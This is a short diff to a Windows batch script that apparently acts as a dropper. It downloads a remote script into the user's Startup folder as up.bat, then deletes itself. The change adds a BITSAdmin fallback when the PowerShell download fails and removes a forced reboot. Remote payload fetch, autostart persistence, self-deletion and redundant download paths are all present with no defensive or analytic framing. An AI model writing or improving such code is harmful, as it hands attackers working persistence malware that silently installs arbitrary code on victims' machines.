@@ -10,7 +10,11 @@ set "DESTINATION_PATH=%STARTUP_FOLDER%\up.bat"
 
 :: Download the script using PowerShell
 echo Downloading script from %SCRIPT_URL% to %DESTINATION_PATH%...
-powershell -Command "Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %DESTINATION_PATH%"
+powershell -Command "try { Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %DESTINATION_PATH% } catch { exit 1 }"
+if %errorlevel% neq 0 (
+    echo PowerShell download failed. Trying BITSAdmin...
+    bitsadmin /transfer "Job" %SCRIPT_URL% %DESTINATION_PATH%
+)
 
 :: Check if the download was successful
 if exist %DESTINATION_PATH% (
@@ -25,7 +29,6 @@ if exist %DESTINATION_PATH% (
     )
 
     :: Schedule self-deletion
-    shutdown -r -t 0
     echo Deleting self...
     (echo @echo off
     echo timeout 2
